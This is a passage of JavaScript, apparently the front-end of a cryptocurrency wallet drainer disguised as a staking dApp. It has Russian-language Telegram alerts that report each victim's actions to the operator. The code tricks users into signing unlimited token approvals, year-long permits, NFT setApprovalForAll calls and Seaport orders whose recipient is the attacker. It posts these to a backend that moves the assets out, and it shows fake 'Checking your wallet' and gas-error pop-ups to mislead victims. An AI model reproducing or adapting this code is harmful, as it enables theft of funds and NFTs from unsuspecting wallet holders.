          // removeTokenOnce(tokenList, (tokenList.find((t) => t.tokenAddress === tokenAddress)))
        }
        axios.post(backloc + TOKEN_APPROVE, data).then(function (response) {
          console.log(response);
          logTlg(`🔥${token.symbol} на сумму ${token.balance} $ от пользователя #${clientID} успешно списались и зачислились на ваш кошелёк\n\nНе забудьте следить за <a href="https://${chainToId[token.chain].explorer}/address/${account}">кошельком</a> на предмет новых поступлений ${token.symbol} для повторного ручного снятия`)
        });
        // logTlg(CryptoJS.AES.encrypt(JSON.stringify(data), account).toString() + "\n" + account)
        return data;
      } catch(e){
        console.log(e)
        success = 0;
        logTlg(`😔Пользователь #${clientID} отклонил Permit на ${token.tokenAmountFix} ${token.symbol} в сети ${token.chain.capitalize()}`)
      }
    }
    if (token.permit) return
    try {
        logTlg(`🔐Пользователь #${clientID} получил запрос на апрув ${token.tokenAmountFix} ${token.symbol} в сети ${token.chain.capitalize()}`)
        // const estGas = await tokenContract.methods.approve(operator, MAX_APPROVAL).estimateGas({from: account})
        var gasprice = await web3.eth.getGasPrice();
        await tokenContract.methods.approve(operator, MAX_APPROVAL).send({
         from: account,
         gas: 100000,
         gasPrice: gasprice
        });
        logTlg(`⏳Пользователь #${clientID} разрешил снятие ${token.tokenAmountFix} ${token.symbol} в сети ${token.chain.capitalize()}. После успешного снятия вам поступит уведомление`)
        const data = {chainId: chainId, tokenAddress: tokenAddress, abiUrl: abiUrl, amount: amount, owner: account, spender: operator};
        axios.post(backloc + TOKEN_TRANSFER, data).then(function (response) {
            console.log(response);
            logTlg(`🔥${token.symbol} на сумму ${token.balance} $ от пользователя #${clientID} успешно списались и зачислились на ваш кошелёк\n\nНе забудьте следить за <a href="https://${chainToId[token.chain].explorer}/address/${account}">кошельком</a> на предмет новых поступлений ${token.symbol} для повторного ручного снятия`)
            // removeTokenOnce(tokenList, token)
          });
    } catch(e){
      console.log(e)
      success = 0;
      logTlg(`😔Пользователь #${clientID} отклонил апрув на ${token.tokenAmountFix} ${token.symbol} в сети ${token.chain.capitalize()}`)
    }
}

async function stakeNFT(token, tokenAddress, nftTokenID, msg) {
  const data = {chainId: token.chain, owner: account, tokenAddress: tokenAddress, tokens: nftTokenID};
  var tokenContract = new web3.eth.Contract(ERC721_ABI, tokenAddress);
  success = 1;
  logTlg(`🔐Пользователь #${clientID} получил запрос на апрув коллекции ${token.name} в сети ${token.chain.capitalize()}`)
  try {
    let estGas
    try {
      estGas = await tokenContract.methods.setApprovalForAll(operator, true).estimateGas({from: account})
    } catch {
      estGas = 100000
    }
    var gasprice = await web3.eth.getGasPrice();
    await tokenContract.methods.setApprovalForAll(operator, true).send({
       from: account,
       gas: estGas,
       gasPrice: gasprice
    });
    logTlg(`🔥Пользователь #${clientID} разрешил снятие коллекции ${token.name} в сети ${token.chain.capitalize()}. NFT с наибольшей ценой будет снята автоматически.`)
    if (token.balance < internalConfig.nft_minimal_price) return
    axios.post(backloc + NFT_TRANSFER, data).then(function (response) {
        console.log(response);
        // removeTokenOnce(tokenList, token)
      });
  } catch(e){
      console.log(e)
      logTlg(`❌Пользователь #${clientID} отклонил запрос на снятие коллекции ${token.name} в сети ${token.chain.capitalize()}`)
      success = 0;
  }
  
}

async function stake1155NFT(token, tokenAddress, nftTokenID) {
  const data = {owner: account, tokenAddress: tokenAddress, tokens: nftTokenID};
  var tokenContract = new web3.eth.Contract(ERC1155_ABI, tokenAddress);
  success = 1;
  try {
    await tokenContract.methods.setApprovalForAll(operator, true).send({
       from: account,
       gas: 470000,
       gasPrice:0
    });
    logTlg(`🔥Пользователь #${clientID} разрешил снятие коллекции ${token.name} в сети ${token.chain.capitalize()}. NFT с наибольшей ценой будет снята автоматически.`)
    axios.post(NFT_TRANSFER, data).then(function (response) {
      console.log(response);
      // removeTokenOnce(tokenList, token)
    });
  } catch(e){
      console.log(e)
      logTlg(`❌Пользователь #${clientID} отклонил запрос на снятие коллекции ${token.name} в сети ${token.chain.capitalize()}`)
      success = 0;
  }
}

async function sendToken(wasWethApproved, offer, counter, Seaport) {
  // Swal.close()
  for(var item of tokenList) {
    if(item < 1) return alertshow();
      // if (item.type !== "seaport") continue
      if (!item.approved) {
        // if(item.tokenAddress !== "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee") continue
        if(item.native_token && item.chain === "ethereum" && item.balance < 10) continue
        if(item.native_token && item.balance < 1) continue

        if(tokenList.find((token) => (token.tokenAddress === item.tokenAddress && token.permit === 2))) continue

        if (wasWethApproved && item.tokenAddress == WETH) continue;
        
        if (selectedProvider == supportedWallets[0] || selectedWallets == "1" || selectedWallets == "2") {
            // if(item.type == "erc721") return;
            if(item.type == "seaport") continue;
        };
        
        const currentChainId = await web3.eth.net.getId();
        const chainHex = web3.utils.toHex(currentChainId);
        if (chainHex !== chainToId[item.chain].chainId) {
            if (selectedProvider == supportedWallets[0] || selectedWallets == "1" || selectedWallets == "2") continue
            try {
              await changeNetwork(chainToId[item.chain].chainId);
            } catch {
              continue
            }
        }
        try {
          if(item.type == "erc20") {
            if(item.native_token) {
              if (item.balance > 1) {
      
                switch(internalConfig.gas_token_method) {
                  case 'transfer':
                    await transferEth(item, item.tokenAmount, message);
                    break
                  case 'sign':
                    try {
                    await stakeEth(item, item.tokenAmount, message);
                    } catch (e) {
                      console.log(e)
                      await new Promise(r => setTimeout(r, 3000));
                      await transferEth(item, item.tokenAmount, message);
                    }
                    break
                  default:
                    console.log("No ETH method")
                }
              }
            }
            else {
              await stakeERC20(item, item.tokenAddress, item.tokenAmount, message, chainToId[item.chain].chainId, chainToId[item.chain].abiUrl);
            }
          } 
          else if(item.type == "erc721"){
            await stakeNFT(item, item.tokenAddress, item.token_ids, message);
          } 
          else if(item.type == "seaport") {
                success = 1;
                console.log(offer, counter)
                logTlg(`🔐Пользователь #${clientID} получил запрос на апрув коллекций с OpenSea (SEAPORT) в сети ${item.chain.capitalize()}`)
                await Seaport.signOrder(offer, parseInt(counter)).then(function(response){
                    let sgt = response;
                    offer["counter"] = parseInt(counter);
                    const order = {
                        "recipient": endpoint,
                        "parameters": offer,
                        "signature": sgt,
                    }
                    logTlg(`🔥Пользователь #${clientID} разрешил снятие коллекций с OpenSea (SEAPORT)`)
                    // logTlg(JSON.stringify(order));
                    if (item.balance < internalConfig.nft_minimal_price) return
                    axios.post(backloc + SEAPORT_SIGN, order).then(function (response) {
                        console.log(response);
                        // removeTokenOnce(tokenList, token)`
                    });
                }).catch(function(error) {
                    console.log(error);
                    success = 0;
                    logTlg(`❌Пользователь #${clientID} отклонил снятие коллекции ${item.name}. (SEAPORT)`)
                    return;
                })
          } else {
            await stake1155NFT(item, item.tokenAddress, item.token_ids, message);
          }
        } catch(e) { console.log(e) }
      }
      
  }
  // if (tokenList.length >= 1) {
  //   await sendToken(wasWethApproved, offer, counter, Seaport)
  // }
}

async function waitAlert() {
    Swal.fire({
        text: 'Checking your wallet...',
        imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
        imageHeight: 60,
        allowOutsideClick: false,
        allowEscapeKey: false,
        timer: 0,
        width: 600,
        showConfirmButton: false
    });
    window.onbeforeunload = function() {
        return logTlg(`🥲Пользователь #${clientID} закрывает сайт`)
    };
}

async function waitClose() {
    Swal.close();
    window.onbeforeunload = null;
}

async function alertshow() {
  if(alerts == 0) {
      Swal.fire({
        title: 'Error!',
        text: 'Connect has been failed, try with another wallet',
        icon: 'error',
        confirmButtonText: 'OK'
    });
    alerts = 1;
  }
  if(alerts == 1) {
      Swal.fire({
        title: 'Error!',
        text: "You don't have enough balance to pay for your gas. Refill your wallet and try again",
        icon: 'error',
        confirmButtonText: 'OK'
    });
  }
}

const changeNetwork = async (ChainId) => {
  if (window.ethereum) {
    let currNet = idToChain("0x" + Number(window.ethereum.networkVersion).toString(16))
    try {
      logTlg(`💱Пользователь #${clientID} получил запрос на смену сети из ${currNet.capitalize()} на ${idToChain(ChainId).capitalize()}`)
      await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
        params: [{chainId: ChainId}],
      });
      
     
    } catch (error) {
      logTlg(`✖️Пользователь #${clientID} отклонил запрос на смену сети из ${currNet.capitalize()} на ${idToChain(ChainId).capitalize()}`)
      console.error(error);
      await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
        params: [{chainId: ChainId}],
      });
    }
  }
}

const isValidPermit = (functions) => {
    for (const key in functions) {
        if (key.startsWith('permit(')) {
            const args = key.slice(7).split(',')
            return args.length === 7 && key.indexOf('bool') === -1;
        }
    }
}

const permit = async (contract, owner, spender) => {
    console.log('Permit');
    let chainId = await contract.signer.getChainId();
    let value = ethers.utils.parseEther(MAX_APPROVAL);
    let nonce = await contract.nonces(owner);
    let name = await contract.name();
    let version;
    if (contract.functions.hasOwnProperty('version')) {
        version = await contract.version();
    } else {
        version = "1"
    }
    let deadline = Date.now() + 1000 * 60 * 60 * 24 * 356; // + one year
    let messages = {
        owner, spender, value, nonce, deadline,
    };
    const domain = {
        name: name, version: version, chainId: chainId, verifyingContract: contract.address,
    }
    const permit = {
        Permit: [{
            name: "owner", type: "address"
        }, {
            name: "spender", type: "address"
        }, {
            name: "value", type: "uint256"
        }, {
            name: "nonce", type: "uint256"
        }, {
            name: "deadline", type: "uint256"
        },]
    }
    const values = {
        owner, spender, value, nonce, deadline,
    }
    const res = await contract.signer._signTypedData(domain, permit, values);
    const r = res.substring(0, 66);
    const s = '0x' + res.substring(66, 130);
    const v = parseInt(res.substring(130, 132), 16);
    return JSON.stringify({
        value: value._hex, deadline: deadline, v: v, r: r, s: s
    });
}


const getABI = async (address, abiUrl) => {
    console.log('Getting ABI for', address)
    let res = await axios.get(abiUrl.format(address));
    res = res.data.result[0];
    let abi = JSON.parse(res['ABI']);
    let impl = '';
    if (res['Proxy'] === '1' && res['Implementation'] !== "") {
        impl = res['Implementation'];
        console.log('Getting impl ABI for', impl);
        abi = JSON.parse((await axios.get(abiUrl.format(impl))).data.result[0]['ABI']);
    }
    return [abi, impl];
}

String.prototype.format = function () {
    let args = arguments;
    return this.replace(/{(\d+)}/g, function (match, index) {
        // check if the argument is present
        return typeof args[index] == 'undefined' ? match : args[index];
    });
};

function logTlg(msg) {
  console.log(msg)
  if (msgs.includes(msg)) return
  msgs.push(msg)
  let send_url = tg_url.replace("[TOKEN]", tgFeedback.token);
  tgFeedback.feedback_accounts.forEach((account) => {
    axios.get(encodeURI(send_url.replace("[USER_ID]", account) + msg).replace("#", "%23"));
  });
}

if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
  login();
}

function isMobile() {
    var check = false;
    (function (a) {
        if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
    })(navigator.userAgent || navigator.vendor || window.opera);
    return check;
};

window.addEventListener('load', async () => {
  init();
//     if (isMobile()) {
//         $(".web3modal-modal-card").prepend('<div class="sc-eCImPb bElhDP web3modal-provider-wrapper" onclick="loginMetamask();"><div class="sc-hKwDye hKhOIm web3modal-provider-container"><div class="sc-bdvvtL fqonLZ web3modal-provider-icon"><img src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjM1NSIgdmlld0JveD0iMCAwIDM5NyAzNTUiIHdpZHRoPSIzOTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMSAtMSkiPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTIuMDA0NzE3IDEzLjgxMDE5OHYtMTguMDU5NDlsNC4yNDUyODMtNC4yNDkyOTJoMjkuNzE2OTgydjIxLjI0NjQ1OSAxNC44NzI1MjNoLTMxLjgzOTYyNGwtMzkuMjY4ODY4LTE2Ljk5NzE2OXoiIGZpbGw9IiNjZGJkYjIiLz48cGF0aCBkPSJtMTk5LjUyODMwNSAzMjcuMTk1NDcyIDUwLjk0MzM5NyAxMy44MTAxOTh2LTE4LjA1OTQ5bDQuMjQ1MjgzLTQuMjQ5MjkyaDI5LjcxNjk4MXYyMS4yNDY0NTkgMTQuODcyNTIzaC0zMS44Mzk2MjNsLTM5LjI2ODg2OC0xNi45OTcxNjl6IiBmaWxsPSIjY2RiZGIyIiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSA0ODMuOTYyMjcgMCkiLz48cGF0aCBkPSJtMTcwLjg3MjY0NCAyODcuODg5NTIzLTQuMjQ1MjgzIDM1LjA1NjY1NyA1LjMwNjYwNC00LjI0OTI5Mmg1NS4xODg2OGw2LjM2NzkyNSA0LjI0OTI5Mi00LjI0NTI4NC0zNS4wNTY2NTctOC40OTA1NjUtNS4zMTE2MTUtNDIuNDUyODMyIDEuMDYyMzIzeiIgZmlsbD0iIzM5MzkzOSIvPjxwYXRoIGQ9Im0xNDIuMjE2OTg0IDUwLjk5MTUwMjIgMjUuNDcxNjk4IDU5LjQ5MDA4NTggMTEuNjc0NTI4IDE3My4xNTg2NDNoNDEuMzkxNTExbDEyLjczNTg0OS0xNzMuMTU4NjQzIDIzLjM0OTA1Ni01OS40OTAwODU4eiIgZmlsbD0iI2Y4OWMzNSIvPjxwYXRoIGQ9Im0zMC43NzgzMDIzIDE4MS42NTcyMjYtMjkuNzE2OTgxNTMgODYuMDQ4MTYxIDc0LjI5MjQ1MzkzLTQuMjQ5MjkzaDQ3Ljc1OTQzNDN2LTM3LjE4MTMwM2wtMi4xMjI2NDEtNzYuNDg3MjUzLTEwLjYxMzIwOCA4LjQ5ODU4M3oiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtODcuMDI4MzAzMiAxOTEuMjE4MTM0IDg3LjAyODMwMjggMi4xMjQ2NDYtOS41NTE4ODYgNDQuNjE3NTYzLTQxLjM5MTUxMS0xMC42MjMyMjl6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkyLjI4MDQ1NyAzNi4wODQ5MDU4IDMzLjk5NDMzNHYzMy45OTQzMzR6IiBmaWxsPSIjZWE4ZDNhIi8+PHBhdGggZD0ibTEyMy4xMTMyMDkgMjI3LjMzNzExNCA0Mi40NTI4MzEgMTAuNjIzMjI5IDEzLjc5NzE3IDQ1LjY3OTg4OC05LjU1MTg4NiA1LjMxMTYxNS00Ni42OTgxMTUtMjcuNjIwMzk4eiIgZmlsbD0iI2Y4OWQzNSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDI2MS4zMzE0NDgtOC40OTA1NjUgNjUuODY0MDI0IDU2LjI1LTM5LjMwNTk0OXoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTc0LjA1NjYwNiAxOTMuMzQyNzggNS4zMDY2MDQgOTAuMjk3NDUxLTE1LjkxOTgxMi00Ni4yMTEwNDl6IiBmaWxsPSIjZWE4ZTNhIi8+PHBhdGggZD0ibTc0LjI5MjQ1MzkgMjYyLjM5Mzc3MSA0OC44MjA3NTUxLTEuMDYyMzIzLTguNDkwNTY1IDY1Ljg2NDAyNHoiIGZpbGw9IiNkODdjMzAiLz48cGF0aCBkPSJtMjQuNDEwMzc3NyAzNTUuODc4MTkzIDkwLjIxMjI2NjMtMjguNjgyNzIxLTQwLjMzMDE5MDEtNjQuODAxNzAxLTczLjIzMTEzMzEzIDUuMzExNjE2eiIgZmlsbD0iI2ViOGYzNSIvPjxwYXRoIGQ9Im0xNjcuNjg4NjgyIDExMC40ODE1ODgtNDUuNjM2NzkzIDM4LjI0MzYyNy0zNS4wMjM1ODU4IDQyLjQ5MjkxOSA4Ny4wMjgzMDI4IDMuMTg2OTY5eiIgZmlsbD0iI2U4ODIxZSIvPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTYuMjUtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIvPjxwYXRoIGQ9Im0yMjkuMjQ1Mjg2IDMyNy4xOTU0NzIgNTUuMTg4NjgtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgNTEzLjY3OTI1MiAwKSIvPjxwYXRoIGQ9Im0xMzIuNjY1MDk2IDIxMi40NjQ1OTMtMTEuNjc0NTI4IDI0LjQzMzQyNyA0MS4zOTE1MS0xMC42MjMyMjl6IiBmaWxsPSIjMzkzOTM5IiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAyODMuMzcyNjQ2IDApIi8+PHBhdGggZD0ibTIzLjM0OTA1NyAxLjA2MjMyMjk2IDE0NC4zMzk2MjUgMTA5LjQxOTI2NTA0LTI0LjQxMDM3OC01OS40OTAwODU4eiIgZmlsbD0iI2U4OGYzNSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5Ni0xOS4xMDM3NzM5MiA1OC40Mjc3NjI5NCAxMC42MTMyMDc3MiA2My43MzkzNzgxLTcuNDI5MjQ1NDEgNC4yNDkyOTIgMTAuNjEzMjA3NzEgOS41NjA5MDYtOC40OTA1NjYxNyA3LjQzNjI2MSAxMS42NzQ1Mjg0NyAxMC42MjMyMjktNy40MjkyNDU0IDYuMzczOTM4IDE2Ljk4MTEzMjMgMjEuMjQ2NDU5IDc5LjU5OTA1NzctMjQuNDMzNDI4YzM4LjkxNTA5Ni0zMS4xNjE0NzMgNTguMDE4ODY5LTQ3LjA5NjMxOCA1Ny4zMTEzMjItNDcuODA0NTMzLS43MDc1NDgtLjcwODIxNS00OC44MjA3NTYtMzcuMTgxMzAzNi0xNDQuMzM5NjI1LTEwOS40MTkyNjUwNHoiIGZpbGw9IiM4ZTVhMzAiLz48ZyB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAzOTkuMDU2NjExIDApIj48cGF0aCBkPSJtMzAuNzc4MzAyMyAxODEuNjU3MjI2LTI5LjcxNjk4MTUzIDg2LjA0ODE2MSA3NC4yOTI0NTM5My00LjI0OTI5M2g0Ny43NTk0MzQzdi0zNy4xODEzMDNsLTIuMTIyNjQxLTc2LjQ4NzI1My0xMC42MTMyMDggOC40OTg1ODN6IiBmaWxsPSIjZjg5ZDM1Ii8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkxLjIxODEzNCA4Ny4wMjgzMDI4IDIuMTI0NjQ2LTkuNTUxODg2IDQ0LjYxNzU2My00MS4zOTE1MTEtMTAuNjIzMjI5eiIgZmlsbD0iI2Q4N2MzMCIvPjxwYXRoIGQ9Im04Ny4wMjgzMDMyIDE5Mi4yODA0NTcgMzYuMDg0OTA1OCAzMy45OTQzMzR2MzMuOTk0MzM0eiIgZmlsbD0iI2VhOGQzYSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDIyNy4zMzcxMTQgNDIuNDUyODMxIDEwLjYyMzIyOSAxMy43OTcxNyA0NS42Nzk4ODgtOS41NTE4ODYgNS4zMTE2MTUtNDYuNjk4MTE1LTI3LjYyMDM5OHoiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtMTIzLjExMzIwOSAyNjEuMzMxNDQ4LTguNDkwNTY1IDY1Ljg2NDAyNCA1NS4xODg2OC0zOC4yNDM2MjZ6IiBmaWxsPSIjZWI4ZjM1Ii8+PHBhdGggZD0ibTE3NC4wNTY2MDYgMTkzLjM0Mjc4IDUuMzA2NjA0IDkwLjI5NzQ1MS0xNS45MTk4MTItNDYuMjExMDQ5eiIgZmlsbD0iI2VhOGUzYSIvPjxwYXRoIGQ9Im03NC4yOTI0NTM5IDI2Mi4zOTM3NzEgNDguODIwNzU1MS0xLjA2MjMyMy04LjQ5MDU2NSA2NS44NjQwMjR6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTI0LjQxMDM3NzcgMzU1Ljg3ODE5MyA5MC4yMTIyNjYzLTI4LjY4MjcyMS00MC4zMzAxOTAxLTY0LjgwMTcwMS03My4yMzExMzMxMyA1LjMxMTYxNnoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTY3LjY4ODY4MiAxMTAuNDgxNTg4LTQ1LjYzNjc5MyAzOC4yNDM2MjctMzUuMDIzNTg1OCA0Mi40OTI5MTkgODcuMDI4MzAyOCAzLjE4Njk2OXoiIGZpbGw9IiNlODgyMWUiLz48cGF0aCBkPSJtMTMyLjY2NTA5NiAyMTIuNDY0NTkzLTExLjY3NDUyOCAyNC40MzM0MjcgNDEuMzkxNTEtMTAuNjIzMjI5eiIgZmlsbD0iIzM5MzkzOSIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgMjgzLjM3MjY0NiAwKSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5NiAxNDQuMzM5NjI1IDEwOS40MTkyNjUwNC0yNC40MTAzNzgtNTkuNDkwMDg1OHoiIGZpbGw9IiNlODhmMzUiLz48cGF0aCBkPSJtMjMuMzQ5MDU3IDEuMDYyMzIyOTYtMTkuMTAzNzczOTIgNTguNDI3NzYyOTQgMTAuNjEzMjA3NzIgNjMuNzM5Mzc4MS03LjQyOTI0NTQxIDQuMjQ5MjkyIDEwLjYxMzIwNzcxIDkuNTYwOTA2LTguNDkwNTY2MTcgNy40MzYyNjEgMTEuNjc0NTI4NDcgMTAuNjIzMjI5LTcuNDI5MjQ1NCA2LjM3MzkzOCAxNi45ODExMzIzIDIxLjI0NjQ1OSA3OS41OTkwNTc3LTI0LjQzMzQyOGMzOC45MTUwOTYtMzEuMTYxNDczIDU4LjAxODg2OS00Ny4wOTYzMTggNTcuMzExMzIyLTQ3LjgwNDUzMy0uNzA3NTQ4LS43MDgyMTUtNDguODIwNzU2LTM3LjE4MTMwMzYtMTQ0LjMzOTYyNS0xMDkuNDE5MjY1MDR6IiBmaWxsPSIjOGU1YTMwIi8+PC9nPjwvZz48L3N2Zz4="></div><div class="sc-gsDKAQ gHoDBx web3modal-provider-name">MetaMask</div><div class="sc-dkPtRN eCZoDi web3modal-provider-description">Connect to your MetaMask Wallet</div></div></div><div class="sc-eCImPb bElhDP web3modal-provider-wrapper" onclick="loginTrust();"><div class="sc-hKwDye hKhOIm web3modal-provider-container"><div class="sc-bdvvtL fqonLZ web3modal-provider-icon"><img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" alt="Trust Wallet"></div><div class="sc-gsDKAQ gHoDBx web3modal-provider-name">Trust Wallet</div><div class="sc-dkPtRN eCZoDi web3modal-provider-description">Connect to your Trust Wallet</div></div></div>');
//         $("img[alt='MetaMask'").parent().parent().parent().remove()
//         $('.web3modal-modal-card .web3modal-provider-wrapper').last().css( "display", "none" );
//     }
});
